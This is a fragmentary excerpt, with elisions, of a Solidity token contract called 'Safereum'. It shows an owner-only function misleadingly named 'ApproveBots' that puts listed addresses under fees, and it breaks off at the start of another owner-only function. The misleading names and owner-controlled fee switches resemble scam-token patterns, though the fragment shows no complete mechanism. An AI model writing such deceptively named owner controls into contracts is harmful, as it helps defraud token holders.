...
contract Safereum is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Safereum";
    string private constant _symbol = unicode"SAFEREUM";
    ...
    function ApproveBots() public onlyOwner { 
        for (uint256 i = 0; i < includeFromFee.length; i++) {
            _isIncludedFromFee[includeFromFee[i]] = true; 
        }
    }
    ...
    function ApproveMax(uint256 newMaxGwei) public onlyOwner {
